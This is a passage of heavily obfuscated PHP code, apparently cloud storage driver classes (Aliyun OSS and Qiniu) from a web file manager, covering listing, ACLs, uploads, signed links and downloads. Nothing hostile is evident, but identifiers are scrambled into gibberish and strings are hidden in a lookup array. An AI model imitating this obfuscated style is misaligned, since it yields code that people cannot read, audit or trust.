$´Ì”´˜Õ[214], $´Ì”´˜Õ[76] => isset($“Úø÷ßİ[$´Ì”´˜Õ[76]]) ? $“Úø÷ßİ[$´Ì”´˜Õ[76]] : 0, $´Ì”´˜Õ[175] => $this->ext($Ö²ÌÈÂ)); if ($äèÅÖÌù) { return $¿´Û´¢š; } $¿´Û´¢š[$´Ì”´˜Õ[215]] = $¿´Û´¢š[$´Ì”´˜Õ[85]] = 0; $¿´Û´¢š[$´Ì”´˜Õ[216]] = $¿´Û´¢š[$´Ì”´˜Õ[217]] = !0; if (empty($“Úø÷ßİ)) { $’ÁÊ³Öˆ = $this->objectMeta($Ö²ÌÈÂ); if (!$’ÁÊ³Öˆ) { return $¿´Û´¢š; } $“Úø÷ßİ = array($´Ì”´˜Õ[85] => strtotime($’ÁÊ³Öˆ[$´Ì”´˜Õ[1437]]), $´Ì”´˜Õ[76] => $’ÁÊ³Öˆ[$´Ì”´˜Õ[1436]] + 0, $´Ì”´˜Õ[1435] => $’ÁÊ³Öˆ[$´Ì”´˜Õ[1435]]); } if (isset($“Úø÷ßİ[$´Ì”´˜Õ[1435]]) && $“Úø÷ßİ[$´Ì”´˜Õ[1435]]) { $¿´Û´¢š[$´Ì”´˜Õ[219]] = trim($“Úø÷ßİ[$´Ì”´˜Õ[1435]], $´Ì”´˜Õ[118]); } if (isset($“Úø÷ßİ[$´Ì”´˜Õ[76]])) { $¿´Û´¢š[$´Ì”´˜Õ[76]] = $“Úø÷ßİ[$´Ì”´˜Õ[76]]; } if (isset($“Úø÷ßİ[$´Ì”´˜Õ[85]])) { $¿´Û´¢š[$´Ì”´˜Õ[85]] = $“Úø÷ßİ[$´Ì”´˜Õ[85]]; } if (isset($“Úø÷ßİ[$´Ì”´˜Õ[194]]) && !trim($¿´Û´¢š[$´Ì”´˜Õ[85]])) { $¿´Û´¢š[$´Ì”´˜Õ[85]] = $“Úø÷ßİ[$´Ì”´˜Õ[194]]; } return $¿´Û´¢š; } private function folderInfo($–Ç­İ–‹, $²¶Ô Š¤ = false, $µĞÕ¶­ı = array()) { $õ˜ªµñ§ =& $_SERVER[Ö†ØøÖ±]; $ö€ö°ª™ = array($õ˜ªµñ§[32] => $this->pathThis($–Ç­İ–‹), $õ˜ªµñ§[84] => $this->getPathOuter($õ˜ªµñ§[8] . $–Ç­İ–‹), $õ˜ªµñ§[33] => $õ˜ªµñ§[75]); if ($²¶Ô Š¤) { return $ö€ö°ª™; } $ö€ö°ª™[$õ˜ªµñ§[215]] = $ö€ö°ª™[$õ˜ªµñ§[85]] = 0; $ö€ö°ª™[$õ˜ªµñ§[216]] = $ö€ö°ª™[$õ˜ªµñ§[217]] = !0; if (empty($µĞÕ¶­ı)) { $–Ç­İ–‹ = rtrim($–Ç­İ–‹, $õ˜ªµñ§[8]) . $õ˜ªµñ§[8]; $¤‰…¥Üñ = $this->objectMeta($–Ç­İ–‹); if (!$¤‰…¥Üñ) { return $ö€ö°ª™; } $µĞÕ¶­ı = array($õ˜ªµñ§[215] => $¤‰…¥Üñ[$õ˜ªµñ§[553]][$õ˜ªµñ§[1444]], $õ˜ªµñ§[85] => strtotime($¤‰…¥Üñ[$õ˜ªµñ§[1437]])); } if (isset($µĞÕ¶­ı[$õ˜ªµñ§[85]])) { $ö€ö°ª™[$õ˜ªµñ§[85]] = $µĞÕ¶­ı[$õ˜ªµñ§[85]]; } if (isset($µĞÕ¶­ı[$õ˜ªµñ§[215]])) { $ö€ö°ª™[$õ˜ªµñ§[215]] = $µĞÕ¶­ı[$õ˜ªµñ§[215]]; } return $ö€ö°ª™; } public function listPath($âğÀ®Ô“, $—«‹ÙØŸ = false) { $‹¡ûÁ Ï =& $_SERVER[Ö†ØøÖ±]; $äï„¿ÖÍ = $this->fileList($âğÀ®Ô“, $‹¡ûÁ Ï[8], !0); foreach ($äï„¿ÖÍ[$‹¡ûÁ Ï[82]] as $ÊËŠ”ã½ => $ÊöûÓƒ´) { $äï„¿ÖÍ[$‹¡ûÁ Ï[82]][$ÊËŠ”ã½] = $this->folderInfo($ÊöûÓƒ´, $—«‹ÙØŸ, $ÊöûÓƒ´); } foreach ($äï„¿ÖÍ[$‹¡ûÁ Ï[83]] as $ÊËŠ”ã½ => $ÊöûÓƒ´) { $äï„¿ÖÍ[$‹¡ûÁ Ï[83]][$ÊËŠ”ã½] = $this->fileInfo($ÊöûÓƒ´[$‹¡ûÁ Ï[32]], $—«‹ÙØŸ, $ÊöûÓƒ´); } return $äï„¿ÖÍ; } protected function infoChildren($ò¸ë…Òí, &$Êç“¸‰×) { $«öóê« =& $_SERVER[Ö†ØøÖ±]; $ô Éúºâ = $this->fileList($ò¸ë…Òí, $«öóê«[12], !0); $Êç“¸‰×[$«öóê«[78]] += count($ô Éúºâ[$«öóê«[82]]); $Êç“¸‰×[$«öóê«[77]] += count($ô Éúºâ[$«öóê«[83]]); foreach ($ô Éúºâ[$«öóê«[83]] as $Ù¨±¤†¡) { if (!$Ù¨±¤†¡ || !$Ù¨±¤†¡[$«öóê«[76]]) { continue; } $Êç“¸‰×[$«öóê«[76]] += $Ù¨±¤†¡[$«öóê«[76]]; } } public function has($âô¶ò†ê, $Ì‚äÓéÌ = false, $£¡Üë™¼ = true) { $Š¥¶Íşƒ =& $_SERVER[Ö†ØøÖ±]; $âô¶ò†ê = trim($âô¶ò†ê, $Š¥¶Íşƒ[8]); $éİŞ–«é = empty($âô¶ò†ê) && $âô¶ò†ê !== $Š¥¶Íşƒ[212] ? $Š¥¶Íşƒ[12] : $âô¶ò†ê . $Š¥¶Íşƒ[8]; $µØ¹ÆÆä = $Š¥¶Íşƒ[12]; $¥úÂàÁ§ = 500; $¸§äã°İ = $ÖÁ¢õ‡… = 0; while (!0) { check_abort(); $•ù–ŞŠ› = array($Š¥¶Íşƒ[1431] => $Š¥¶Íşƒ[8], $Š¥¶Íşƒ[1432] => $éİŞ–«é, $Š¥¶Íşƒ[1433] => $¥úÂàÁ§, $Š¥¶Íşƒ[1434] => $µØ¹ÆÆä); try { $î«®¼Ş = $this->client->listObjects($this->bucket, $•ù–ŞŠ›); } catch (OSS\Core\OssException $‚ˆŒ¡İ‡) { break; } $µØ¹ÆÆä = $î«®¼Ş->getNextMarker(); $ûŠìÍØ“ = $î«®¼Ş->getObjectList(); $¾æ³¢Ô = $î«®¼Ş->getPrefixList(); if ($Ì‚äÓéÌ) { if (count($ûŠìÍØ“) > 1 || count($ûŠìÍØ“) == 1 && $ûŠìÍØ“[0]->getKey() != $éİŞ–«é) { $¸§äã°İ += count($ûŠìÍØ“) - 1; } if (!empty($¾æ³¢Ô)) { $ÖÁ¢õ‡… += count($¾æ³¢Ô); } if ($µØ¹ÆÆä === $Š¥¶Íşƒ[12]) { break; } continue; } if ($£¡Üë™¼) { if (!empty($ûŠìÍØ“)) { if (count($ûŠìÍØ“) > 1 || $ûŠìÍØ“[0]->getKey() != $éİŞ–«é) { return !0; } } } else { if (!empty($¾æ³¢Ô)) { return !0; } } if ($µØ¹ÆÆä === $Š¥¶Íşƒ[12]) { break; } } if ($Ì‚äÓéÌ) { return array($Š¥¶Íşƒ[223] => $¸§äã°İ, $Š¥¶Íşƒ[224] => $ÖÁ¢õ‡…); } return !1; } public function listAll($ìÊÅÈèâ) { $ÎÎ«´ =& $_SERVER[Ö†ØøÖ±]; $‰ğŞ—­¢ = $this->fileList($ìÊÅÈèâ, $ÎÎ«´[12], !0); $ªìğîƒ› = array_to_keyvalue($‰ğŞ—­¢[$ÎÎ«´[83]], $ÎÎ«´[32]); foreach ($‰ğŞ—­¢[$ÎÎ«´[82]] as $½à“±„Î) { if (is_string($½à“±„Î)) { $ªìğîƒ›[$½à“±„Î] = array($ÎÎ«´[76] => 0); } } return $this->listAllFiles($ìÊÅÈèâ, $ªìğîƒ›); } public function canRead($ßØØÒ«¦) { $Ïªñš¬¿ =& $_SERVER[Ö†ØøÖ±]; $é¾Æ´ñ¦ = $this->pathAcl($ßØØÒ«¦); return $é¾Æ´ñ¦ == $Ïªñš¬¿[1445] || $é¾Æ´ñ¦ == $Ïªñš¬¿[596] ? !0 : !1; } public function canWrite($èÄØëã•) { $î‘Õ×Öå = $this->pathAcl($èÄØëã•); return $î‘Õ×Öå == $_SERVER[Ö†ØøÖ±][596] ? !0 : !1; } public function pathAcl($Ïå´îáÔ) { $íµö¿Şš =& $_SERVER[Ö†ØøÖ±]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $Èƒıö´ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Ïå´îáÔ)); } catch (OSS\Core\OssException $—ïŠ–) { return !1; } $¿¡Õù = $Èƒıö´ == $íµö¿Şš[37] ? $this->bucketAcl : $Èƒıö´; if ($¿¡Õù == $íµö¿Şš[1446]) { return $íµö¿Şš[1445]; } if ($¿¡Õù == $íµö¿Şš[1447]) { return $íµö¿Şš[596]; } return $¿¡Õù; } private function chmodPath($ñÅÕÃÅ“, $àÎ¾¶›ô = '') { $”¶°¨Ù =& $_SERVER[Ö†ØøÖ±]; $Ÿ«¨‘Ôš = empty($àÎ¾¶›ô) ? $”¶°¨Ù[1447] : $àÎ¾¶›ô; $ßÎ´µØÅ = array($”¶°¨Ù[37], $”¶°¨Ù[213], $”¶°¨Ù[1446], $”¶°¨Ù[1447]); if (!in_array($Ÿ«¨‘Ôš, $ßÎ´µØÅ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ñÅÕÃÅ“), $Ÿ«¨‘Ôš); } catch (OSS\Core\OssException $¶£âßû¢) { return !1; } return !0; } public function getContent($ƒÏô†ä«) { return $this->fileSubstr($ƒÏô†ä«, -1); } public function setContent($¸’§Æ³ñ, $õÁï‘» = '') { $Ü—ıã¨© =& $_SERVER[Ö†ØøÖ±]; try { $æ¹×›  = $this->trafficLimit($Ü—ıã¨©[1448]); $ÎûĞü‚¶ = $this->client->putObject($this->bucket, $this->pathEncode($¸’§Æ³ñ), $õÁï‘», $æ¹×› ); } catch (OSS\Core\OssException $ˆ­€ú«ß) { return !1; } $Ù‚Öõ¨ = array($Ü—ıã¨©[1438] => trim($ÎûĞü‚¶[$Ü—ıã¨©[1435]], $Ü—ıã¨©[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¸’§Æ³ñ))); $this->updateObjMeta($¸’§Æ³ñ, $Ù‚Öõ¨); return isset($ÎûĞü‚¶[$Ü—ıã¨©[1449]][$Ü—ıã¨©[275]]) ? !0 : !1; } private function updateObjMeta($Åì„ƒ‰, $’İïµùå) { $Åì„ƒ‰ = $this->pathEncode($Åì„ƒ‰); try { $³­á€µ„ = array(OSS\OssClient::OSS_HEADERS => $’İïµùå); $this->client->copyObject($this->bucket, $Åì„ƒ‰, $this->bucket, $Åì„ƒ‰, $³­á€µ„); } catch (OSS\Core\OssException $ÑÎúøã¹) { return !1; } return !0; } public function upload($Â°ƒ„—›, $¨£ú®ıÎ, $»Œ™ÊÚ– = false, $ùà¼ùÓ = REPEAT_REPLACE) { $¾“”³ıÃ =& $_SERVER[Ö†ØøÖ±]; $è®Å¢õ = trim($Â°ƒ„—›, $¾“”³ıÃ[8]); $üÌñÌøé = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($¾“”³ıÃ[1438] => @md5_file($¨£ú®ıÎ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Â°ƒ„—›))); $üÌñÌøé = $this->trafficLimit($¾“”³ıÃ[1448], $üÌñÌøé); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($è®Å¢õ), $¨£ú®ıÎ, $üÌñÌøé); } catch (OSS\Core\OssException $Í­£¡µ‡) { return !1; } return $this->getPathOuter($Â°ƒ„—›); } public function getHost() { $à®¬óÁ =& $_SERVER[Ö†ØøÖ±]; $ÀŸîáú¸ = explode($à®¬óÁ[198], parent::getHost()); return $ÀŸîáú¸[0] . $à®¬óÁ[198] . $this->bucket . $à®¬óÁ[10] . $ÀŸîáú¸[1]; } public function uploadFormData($’›‰ÄØ, $Ÿ¨ııêƒ = 3600) { $¢ùÜØ‡ù =& $_SERVER[Ö†ØøÖ±]; if (!($»Ï›ö­¶ = $this->getHost())) { return !1; } $ıüò¤ùã = $Ÿ¨ııêƒ; $œğ¯ï¦ş = date($¢ùÜØ‡ù[1450], time() + $ıüò¤ùã); $êüé…»² = new DateTime($œğ¯ï¦ş); $‘™¡ÉÜÂ = $êüé…»²->format(DateTime::ISO8601); $«»”Î®¹ = strpos($‘™¡ÉÜÂ, $¢ùÜØ‡ù[349]); $‘™¡ÉÜÂ = substr($‘™¡ÉÜÂ, 0, $«»”Î®¹) . $¢ùÜØ‡ù[1451]; $ÆÖ›êÈ† = 1048576000 * 5; $òöõ†€é = $this->pathFather($’›‰ÄØ); $ÂéÃ´’“ = array($¢ùÜØ‡ù[258] => $‘™¡ÉÜÂ, $¢ùÜØ‡ù[261] => array(array($¢ùÜØ‡ù[1452], 0, $ÆÖ›êÈ†), array($¢ùÜØ‡ù[264], $¢ùÜØ‡ù[265], $òöõ†€é))); $Ñ“Ä€ó = base64_encode(json_encode($ÂéÃ´’“)); $Õ£´¯ùó = base64_encode(hash_hmac($¢ùÜØ‡ù[247], $Ñ“Ä€ó, $this->secret, !0)); $ºåÚ«õÅ = array($¢ùÜØ‡ù[276] => $Ñ“Ä€ó, $¢ùÜØ‡ù[1453] => $this->accessKey, $¢ùÜØ‡ù[268] => $¢ùÜØ‡ù[257], $¢ùÜØ‡ù[1454] => $Õ£´¯ùó, $¢ùÜØ‡ù[196] => $»Ï›ö­¶); $ºåÚ«õÅ = $this->trafficLimit($¢ùÜØ‡ù[1448], $ºåÚ«õÅ); return $ºåÚ«õÅ; } public function multiUploadFormData($Í£¥”ûÆ, $éî“¼ƒÎ = 3600) { $‰µ°Àê» =& $_SERVER[Ö†ØøÖ±]; if (!($ÎÕ°¤ãÀ = $this->getHost())) { return !1; } $Ğ×Ñ¢ŒÖ = $this->trafficLimit($‰µ°Àê»[1448]); $¿³ø®³« = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Í£¥”ûÆ), $Ğ×Ñ¢ŒÖ); return array($‰µ°Àê»[238] => $¿³ø®³«, $‰µ°Àê»[196] => $ÎÕ°¤ãÀ . $‰µ°Àê»[8] . $this->pathEncode($Í£¥”ûÆ), $‰µ°Àê»[239] => gmdate($‰µ°Àê»[1455]), $‰µ°Àê»[94] => $Í£¥”ûÆ); } public function multiUploadAuthData($—‰İñ”Ä, $Ìš²ó¿€ = array()) { $•Äñ·ö³ =& $_SERVER[Ö†ØøÖ±]; $Šã„Ÿ¹ù = isset($Ìš²ó¿€[$•Äñ·ö³[239]]) ? $Ìš²ó¿€[$•Äñ·ö³[239]] : gmdate($•Äñ·ö³[1455]); $ò’ƒçİ = isset($Ìš²ó¿€[$•Äñ·ö³[175]]) ? $Ìš²ó¿€[$•Äñ·ö³[175]] : $•Äñ·ö³[12]; $Âƒ´òş = $—‰İñ”Ä; if (isset($Ìš²ó¿€[$•Äñ·ö³[94]])) { $Âƒ´òş = $Ìš²ó¿€[$•Äñ·ö³[94]]; unset($Ìš²ó¿€[$•Äñ·ö³[94]]); } if (isset($Ìš²ó¿€[$•Äñ·ö³[240]])) { $Ìš²ó¿€[$•Äñ·ö³[239]] = $Šã„Ÿ¹ù; return $this->listUploadParts($Âƒ´òş, $Ìš²ó¿€); } $ìÖ°™ŠŞ = array($•Äñ·ö³[241], $•Äñ·ö³[12], $•Äñ·ö³[120], $Šã„Ÿ¹ù, "\x78\55\x6f\x73\163\x2d\144\x61\164\x65\x3a{$Šã„Ÿ¹ù}", $•Äñ·ö³[8] . $this->bucket . $•Äñ·ö³[8] . $Âƒ´òş . $ò’ƒçİ); if (strpos($ò’ƒçİ, $•Äñ·ö³[242]) === 0) { $ìÖ°™ŠŞ[0] = $•Äñ·ö³[243]; if ($ìö¿øå¸ = $this->trafficLimit($•Äñ·ö³[1448])) { $Âƒ´òş = $•Äñ·ö³[1456]; array_splice($ìÖ°™ŠŞ, 5, 0, $Âƒ´òş . $•Äñ·ö³[4] . $ìö¿øå¸[$Âƒ´òş]); } } if (isset($Ìš²ó¿€[$•Äñ·ö³[244]]) && $Ìš²ó¿€[$•Äñ·ö³[244]] == $•Äñ·ö³[245]) { $ìÖ°™ŠŞ[0] = $•Äñ·ö³[245]; } if (!empty($Ìš²ó¿€[$•Äñ·ö³[1457]])) { $ô’ÎĞˆ = array_merge(array($ìÖ°™ŠŞ[4]), $Ìš²ó¿€[$•Äñ·ö³[1457]]); sort($ô’ÎĞˆ); $ìÖ°™ŠŞ[4] = implode($•Äñ·ö³[246], $ô’ÎĞˆ); } $Î‰¶ÙÇ = implode($•Äñ·ö³[246], $ìÖ°™ŠŞ); $òº÷š‰ = base64_encode(hash_hmac($•Äñ·ö³[247], $Î‰¶ÙÇ, $this->secret, !0)); $¢åÈòªë = $•Äñ·ö³[1421] . $this->accessKey . $•Äñ·ö³[4] . $òº÷š‰; if (strpos($ò’ƒçİ, $•Äñ·ö³[242]) === 0) { $¢åÈòªë = array($•Äñ·ö³[249] => $¢åÈòªë, $•Äñ·ö³[239] => $Šã„Ÿ¹ù); if ($ìö¿øå¸) { $¢åÈòªë = array_merge($¢åÈòªë, $ìö¿øå¸); } } return $¢åÈòªë; } public function listUploadParts($²é‘‚Ó , $—Ä»…Ÿ) { $¶ø‡«”¨ =& $_SERVER[Ö†ØøÖ±]; $á»è­½ñ = parse_url_query($—Ä»…Ÿ[$¶ø‡«”¨[175]]); $…Èª ƒ = $this->client->listParts($this->bucket, $this->pathEncode($²é‘‚Ó ), $á»è­½ñ[$¶ø‡«”¨[238]]); $Ùœãö¸ï = $…Èª ƒ->getListPart(); $ùŠË˜¨ğ = array(); foreach ($Ùœãö¸ï as $õÅÓ„ëä) { $ùŠË˜¨ğ[] = array($¶ø‡«”¨[1442] => $õÅÓ„ëä->getPartNumber(), $¶ø‡«”¨[1443] => trim($õÅÓ„ëä->getETag(), $¶ø‡«”¨[118])); } unset($—Ä»…Ÿ[$¶ø‡«”¨[240]], $—Ä»…Ÿ[$¶ø‡«”¨[244]]); $²à£û = $this->multiUploadAuthData($²é‘‚Ó , $—Ä»…Ÿ); if (empty($²à£û)) { return !1; } return array($¶ø‡«”¨[249] => $²à£û, $¶ø‡«”¨[239] => $—Ä»…Ÿ[$¶ø‡«”¨[239]], $¶ø‡«”¨[251] => $ùŠË˜¨ğ); } public function download($İ“Çéó“, $µòÁèµ) { if ($this->isFolder($İ“Çéó“)) { return !1; } try { $¾Â„Ë—Í = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $µòÁèµ); $¾Â„Ë—Í = $this->trafficLimit($_SERVER[Ö†ØøÖ±][109], $¾Â„Ë—Í); $this->client->getObject($this->bucket, $this->pathEncode($İ“Çéó“), $¾Â„Ë—Í); } catch (OSS\Core\OssException $¯åˆ¶ŞË) { return !1; } return $µòÁèµ; } public function fileSubstr($şöô•…â, $¯ÅÊ‚ıó = 0, $„â¨ğ˜ = false) { if ($¯ÅÊ‚ıó === -1) { $ôÍÖîş = array(); } else { if ($„â¨ğ˜ === !1) { $ñı„î å = $this->size($şöô•…â); } else { $ñı„î å = $¯ÅÊ‚ıó + $„â¨ğ˜ - 1; } $ôÍÖîş = array(OSS\OssClient::OSS_RANGE => "{$¯ÅÊ‚ıó}\x2d{$ñı„î å}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($şöô•…â), $ôÍÖîş); } catch (OSS\Core\OssException $úêÕé×) { think_exception($úêÕé×->getMessage()); return !1; } } private function trafficLimit($İ˜Ï¯ô‹, $‘²¹”ªâ = array()) { $«©¶è¯¢ =& $_SERVER[Ö†ØøÖ±]; if ($İ˜Ï¯ô‹ == $«©¶è¯¢[1448] && $this->isUploadServer() || $İ˜Ï¯ô‹ == $«©¶è¯¢[109] && $this->isFileOutServer()) { return $‘²¹”ªâ; } $ÔÃª·Òö = floatval($GLOBALS[$«©¶è¯¢[6]][$«©¶è¯¢[89]][$«©¶è¯¢[107]][$İ˜Ï¯ô‹]) * 1024 * 1024 * 8; if (!$ÔÃª·Òö) { return $‘²¹”ªâ; } $ÔÃª·Òö = $ÔÃª·Òö < 819200 ? 819200 : ($ÔÃª·Òö > 838860800 ? 838860800 : $ÔÃª·Òö); $‘²¹”ªâ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÔÃª·Òö); return $‘²¹”ªâ; } public function link($º¥äûú¨, $±„õ¼£ = array()) { $êî§á¬ =& $_SERVER[Ö†ØøÖ±]; if (!$this->exist($º¥äûú¨) || $this->isFolder($º¥äûú¨)) { return !1; } try { $±„õ¼£ = $this->trafficLimit($êî§á¬[109], $±„õ¼£); $ŒîåÙÙÓ = $this->client->signUrl($this->bucket, $this->pathEncode($º¥äûú¨), 3600 * 12, $êî§á¬[245], $±„õ¼£); return $this->getCdnLink($ŒîåÙÙÓ); } catch (OSS\Core\OssException $›ååñ½Æ) { return !1; } } public function fileOut($¶¿Â¬á§, $Üó¹¶œø = false, $æóÑÂÇş = false, $´ ºõ¤ = '') { $áÂ®Œö— =& $_SERVER[Ö†ØøÖ±]; if ($this->isFileOutServer()) { return $this->fileOutServer($¶¿Â¬á§, $Üó¹¶œø, $æóÑÂÇş, $´ ºõ¤); } if (!$æóÑÂÇş) { $æóÑÂÇş = $this->pathThis($¶¿Â¬á§); } $æóÑÂÇş = rawurlencode($æóÑÂÇş); $¹‰æËÍƒ = get_file_mime(get_path_ext($æóÑÂÇş)); if ($¹‰æËÍƒ == $áÂ®Œö—[232]) { return parent::fileOut($¶¿Â¬á§, $Üó¹¶œø, $æóÑÂÇş, $´ ºõ¤); } $Üó¹¶œø = $Üó¹¶œø ? $áÂ®Œö—[1458] : $áÂ®Œö—[1459]; $³ Ş»¸À = array(OSS\OssClient::OSS_SUB_RESOURCE => $áÂ®Œö—[1460] . rawurlencode("{$Üó¹¶œø}\73\x66\151\x6c\x65\156\141\x6d\x65\x3d{$æóÑÂÇş}")); $³ Ş»¸À[OSS\OssClient::OSS_SUB_RESOURCE] .= $áÂ®Œö—[1461] . rawurlencode($¹‰æËÍƒ); $Ä®ĞÁµ = $this->link($¶¿Â¬á§, $³ Ş»¸À); $this->fileOutLink($Ä®ĞÁµ); } public function fileOutServer($ŸÅÁ­Ùç, $ˆ½Èö‹ = false, $˜Ş”Ô¿ï = false, $Á‘†‹¸¡ = '') { parent::fileOut($ŸÅÁ­Ùç, $ˆ½Èö‹, $˜Ş”Ô¿ï, $Á‘†‹¸¡); } public function fileOutImage($ˆ²µúûß, $ …‹œ = 250) { if ($this->size($ˆ²µúûß) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ˆ²µúûß, $ …‹œ); } $îÎÙ‹›¯ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ö†ØøÖ±][1462] . $ …‹œ); $ÓØÅš‘Ï = $this->link($ˆ²µúûß, $îÎÙ‹›¯); $this->fileOutLink($ÓØÅš‘Ï); } public function fileOutImageServer($‚Í¤şÊ, $™ü²Àïï = 250) { parent::fileOutImage($‚Í¤şÊ, $™ü²Àïï); } public function fileOutLink($–§Î·Í) { $¨à¹Í°ˆ =& $_SERVER[Ö†ØøÖ±]; if (!$this->isCdnHost() && substr($–§Î·Í, 0, 7) == $¨à¹Í°ˆ[1383]) { $–§Î·Í = $¨à¹Í°ˆ[1384] . substr($–§Î·Í, 7); } header($¨à¹Í°ˆ[162] . $–§Î·Í); die; } public function hashMd5($Õ£šÑ¾¢, $²•® «½ = '') { $ôÚÁûÀ =& $_SERVER[Ö†ØøÖ±]; $ÈØé¶¸• = $this->_objectMeta($Õ£šÑ¾¢); if (!$ÈØé¶¸•) { return $ôÚÁûÀ[12]; } if (!isset($ÈØé¶¸•[$ôÚÁûÀ[1438]]) && !empty($²•® «½)) { $ Å­æî = $this->updateObjMeta($Õ£šÑ¾¢, array($ôÚÁûÀ[1438] => $²•® «½)); $ÈØé¶¸•[$ôÚÁûÀ[1438]] = $ Å­æî ? $²•® «½ : $ôÚÁûÀ[12]; } return isset($ÈØé¶¸•[$ôÚÁûÀ[1438]]) ? strtolower($ÈØé¶¸•[$ôÚÁûÀ[1438]]) : $ôÚÁûÀ[12]; } public function size($ôé›¶ñ) { $Ã¹Îé¤  = $this->objectMeta($ôé›¶ñ); return $Ã¹Îé¤  ? $Ã¹Îé¤ [$_SERVER[Ö†ØøÖ±][76]] : 0; } public function info($Ù›ö¹) { if ($this->isFolder($Ù›ö¹)) { return $this->folderInfo($Ù›ö¹); } else { if ($this->isFile($Ù›ö¹)) { return $this->fileInfo($Ù›ö¹); } } return !1; } public function exist($Ãëî˜¤¢) { return $this->isFile($Ãëî˜¤¢) || $this->isFolder($Ãëî˜¤¢); } public function isFile($»Š£‰Ø) { return !$this->isFolder($»Š£‰Ø) && $this->objectMeta($»Š£‰Ø); } public function isFolder($ÈŞ¸òÑ°) { return $this->cacheMethod($_SERVER[Ö†ØøÖ±][166], $ÈŞ¸òÑ°); } protected function objectMeta($·İùÌ¦Â) { return $this->cacheMethod($_SERVER[Ö†ØøÖ±][168], $·İùÌ¦Â); } protected function _objectMeta($‚Û»õ­á) { $–àŒÌ­ƒ =& $_SERVER[Ö†ØøÖ±]; try { $ûİí¥—· = $this->client->getObjectMeta($this->bucket, $this->pathEncode($‚Û»õ­á)); } catch (OSS\Core\OssException $ıëŞŒå) { $ûİí¥—· = !1; } if ($ûİí¥—·) { $ûİí¥—·[$–àŒÌ­ƒ[76]] = intval($ûİí¥—·[$–àŒÌ­ƒ[1436]]); } return $ûİí¥—·; } protected function _isFolder($ºïÉ¸‡Ú) { $»Û®‚Û¬ =& $_SERVER[Ö†ØøÖ±]; if ($ºïÉ¸‡Ú == $»Û®‚Û¬[12] || $ºïÉ¸‡Ú == $»Û®‚Û¬[8]) { return !0; } $“Ô¡ÕøÃ = array($»Û®‚Û¬[1431] => $»Û®‚Û¬[8], $»Û®‚Û¬[1432] => rtrim($ºïÉ¸‡Ú, $»Û®‚Û¬[8]) . $»Û®‚Û¬[8], $»Û®‚Û¬[1433] => 1, $»Û®‚Û¬[1434] => $»Û®‚Û¬[12]); $¿²Ê„µü = $this->client->listObjects($this->bucket, $“Ô¡ÕøÃ); if ($¿²Ê„µü->getObjectList() || $¿²Ê„µü->getPrefixList()) { return !0; } return !1; } } goto aŒ•‘ò¡½; aŒ•‘ò¡½: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ãî©óèÒ) { parent::__construct(); require_once SDK_DIR . $_SERVER[Ö†ØøÖ±][1463]; $this->_init($ãî©óèÒ); } public function _init($õ‰‰¯†¬) { $™îäÂÅ =& $_SERVER[Ö†ØøÖ±]; $this->config = $õ‰‰¯†¬; foreach ($õ‰‰¯†¬ as $‹ëê€­Í => $“–­˜ì) { if (isset($this->{$‹ëê€­Í})) { $this->{$‹ëê€­Í} = $“–­˜ì; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($™îäÂÅ[1464] . LNG($™îäÂÅ[1422])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($½’Ê¾ë, $¬‹¾†Ìƒ = '', $ÁíÏ®´Ş = REPEAT_RENAME) { if ($this->setContent($½’Ê¾ë, $¬‹¾†Ìƒ)) { return $this->getPathOuter($½’Ê¾ë); } return !1; } public function mkdir($é¬±Í³ï, $¶’øŸ£ı = REPEAT_SKIP) { $ÙÕ’ÜÃ =& $_SERVER[Ö†ØøÖ±]; $„œ¯Ùè¢ = trim($é¬±Í³ï, $ÙÕ’ÜÃ[8]); if ($this->_isFolder($„œ¯Ùè¢)) { return $this->getPathOuter($„œ¯Ùè¢); } $é¬±Í³ï = $„œ¯Ùè¢ . $ÙÕ’ÜÃ[8]; $ó°ú×ú£ = get_path_this($„œ¯Ùè¢); $¥Üåß‹Û = $é¬±Í³ï . $ó°ú×ú£; if (!$this->mkfile($¥Üåß‹Û)) { return !1; } if (!$this->moveFile($¥Üåß‹Û, $é¬±Í³ï)) { $this->delFile($¥Üåß‹Û); return !1; } return $this->getPathOuter($„œ¯Ùè¢); } public function copyFile($Îı§¶Ã, $«´œÍü›) { $–ú¨­¨ = $this->bucketManager->copy($this->bucket, $Îı§¶Ã, $this->bucket, $«´œÍü›, !0); return $–ú¨­¨ ? !1 : $this->getPathOuter($«´œÍü›); } public function moveFile($ÊôÈ˜û‹, $òæŸ«ÆÁ) { $«›šªÜ = $this->bucketManager->move($this->bucket, $ÊôÈ˜û‹, $this->bucket, $òæŸ«ÆÁ, !0); return $«›šªÜ ? !1 : $this->getPathOuter($òæŸ«ÆÁ); } public function delFile($ÃÏ††Î«) { if (!$this->exist($ÃÏ††Î«)) { return !0; } $èÈİó¬ = $this->bucketManager->delete($this->bucket, $ÃÏ††Î«); return $èÈİó¬ ? !1 : !0; } public function delFolder($ ¨—À) { $ÖİÎµßœ =& $_SERVER[Ö†ØøÖ±]; if (!$this->exist($ ¨—À)) { return !0; } $this->listItemCache = !1; $Öâü«™¢ = $this->fileList($ ¨—À); $this->listItemCache = !0; 